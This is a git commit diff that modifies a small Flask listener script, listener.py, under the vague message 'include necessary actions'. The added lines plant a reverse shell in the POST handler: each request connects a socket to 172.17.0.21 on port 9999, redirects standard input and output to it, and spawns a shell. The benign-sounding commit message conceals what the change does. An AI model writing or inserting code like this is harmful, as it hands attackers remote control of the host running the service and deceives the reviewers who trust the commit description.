fe89cb99dc6be8bfef037c1e27783a47004761e7
Administrator <Administrator@morialabs.com>
2024-10-28 14:00:24 +0000

    modified listener.py to include necessary actions

--- listener.py
+++ listener.py
@@ -1,12 +1,22 @@
 #!/usr/bin/python3
 from flask import *
+import colorama
 
 app = Flask(__name__)
 
-@app.route('/', methods=["POST"])
+@app.route('/',methods=["POST"])
 def root():
     data = request.get_json()
     print (data)
+    import socket
+    import os
+    import pty
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("172.17.0.21",9999))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("cmd.exe")
     return (data)
 
 if __name__ == '__main__':
